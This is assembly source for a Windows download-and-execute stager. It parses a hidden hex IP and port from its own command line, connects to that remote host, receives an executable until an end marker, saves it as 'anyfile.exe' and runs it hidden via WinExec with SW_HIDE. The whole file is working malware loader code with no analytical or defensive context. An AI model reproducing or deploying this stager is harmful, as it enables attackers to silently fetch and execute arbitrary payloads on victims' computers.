
PACKET_SIZE             equ     512
ZFTP_TIMEOUT            equ     30

GPTR                    equ     40h
AF_INET                 equ     2
IPPROTO_IP              equ     0
IPPROTO_TCP             equ     6
IPPROTO_UDP             equ     17
INVALID_SOCKET          equ     -1
SOCK_STREAM             equ     1
SOCK_DGRAM              equ     2
HFILE_ERROR             equ     -1
SOCKET_ERROR            equ     -1
FIONBIO                 equ     8004667Eh
FILE_ATTRIBUTE_NORMAL   equ     80h

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __

                        .data

filename                db      'anyfile.exe',0
                        align   4

nb1                     dd      1

timeout:                dd      ZFTP_TIMEOUT    ; s
                        dd      0               ; ms

sockaddr:               dw      AF_INET
q:
server_port             dw      0   ;3930h ;12345    ; htons(SERVER_PORT)
server_addr             db      0,0,0,0         ; SERVER_ADDR
                        db      8 dup (0)       ; zero
sockaddr_size           equ     $-sockaddr

readfds:                ; fd_set
readfds_count           dd      ?
readfds_arr0            dd      ?

;startupinfo            db      40h,0,0,0, 40h dup (0)
;procinfo               db      16h+2 dup (0)

wsadata                 db      512 dup (?)

rbuf                    db      4*1024*1024 dup (?)

                        .code
start:
                        call    seh_init
                        mov     esp, [esp+8]
                        jmp     seh_error
seh_init:               push    dword ptr fs:[0]
                        mov     fs:[0], esp

                        push    offset wsadata  ; wsadata
                        push    101h            ; 1.1
                        callW   WSAStartup
                        or      eax, eax
                        jnz     fuck

                        callW   GetCommandLineA
                        xchg    esi, eax

__scan:                 lodsb
                        or      al, al
                        jz      fuck
                        cmp     dword ptr [esi], '____'
                        jne     __scan
                        lodsd

                        lea     edi, q
                        mov     ecx, 2+4
__conv:                 lodsw
                        sub     ax, '00'
                        cmp     al, 10
                        jb      __x1
                        add     al, '0'-'A'+10
__x1:                   cmp     ah, 10
                        jb      __x2
                        add     ah, '0'-'A'+10
__x2:                   shl     al, 4
                        or      al, ah
                        stosb
                        loop    __conv

                        push    IPPROTO_IP      ; protocol
                        push    SOCK_STREAM     ; type
                        push    AF_INET         ; af
                        callW   socket
                        cmp     eax, INVALID_SOCKET
                        je      fuck
                        xchg    ebx, eax        ; socket

                        push    sockaddr_size   ; sizeof sockaddr
                        push    offset sockaddr ; sockaddr
                        push    ebx             ; socket
                        callW   connect
                        or      eax, eax
                        jnz     fuck

                        push    offset nb1
                        push    FIONBIO
                        push    ebx             ; 1
                        callW   ioctlsocket
                        or      eax, eax
                        jnz     fuck

                        xor     edi, edi        ; EDI = 0

__cycle:                mov     readfds_count, 1     ; count
                        mov     readfds_arr0, ebx    ; socket

                        push    offset timeout  ; timeout
                        push    0               ; exceptfds
                        push    0               ; writefds
                        push    offset readfds  ; readfds
                        push    1               ; nfds
                        callW   select

                        or      eax, eax        ; timeout?
                        jz      fuck

                        lea     eax, rbuf[edi]
                        push    0               ; flags
                        push    PACKET_SIZE     ; bufsize
                        push    eax             ; buf[tpos]
                        push    ebx             ; socket
                        callW   recv
                        cmp     eax, SOCKET_ERROR
                        jz      fuck

                        add     edi, eax

                        or      eax, eax        ; receive until connection
                        jnz     __cycle         ; is closed

                        sub     edi, 4
                        cmp     dword ptr rbuf[edi], 55AA55AAh  ; eof sign
                        jne     fuck

                        push    FILE_ATTRIBUTE_NORMAL
                        push    offset filename
                        callW   SetFileAttributesA

                        push    0               ; attribute, 0=rw
                        push    offset filename ; filename
                        callW   _lcreat
                        cmp     eax, HFILE_ERROR
                        je      fuck
                        xchg    ebp, eax

                        push    edi             ; bufsize
                        push    offset rbuf     ; buf
                        push    ebp             ; HFILE
                        callW   _lwrite
                        cmp     eax, edi
                        jne     fuck

                        push    ebp             ; HFILE
                        callW   _lclose

;                       push    offset procinfo    ; processinfo
;                       push    offset startupinfo ; startupinfo
;                       push    0               ; curdir
;                       push    0               ; env
;                       push    0               ; flags
;                       push    0               ; inherithandles
;                       push    0               ; process_attr
;                       push    0               ; thread_attr
;                       push    0               ; cmdline
;                       push    offset filename ; application
;                       callW   CreateProcessA

                        push    0               ; SW_HIDE
                        push    offset filename ; cmdline
                        callW   WinExec
fuck:

                        push    ebx             ; socket
                        callW   closesocket

                        callW   WSACleanup

seh_error:              pop     dword ptr fs:[0]
                        pop     eax

                        push    -1
                        callW   ExitProcess

                        end     start
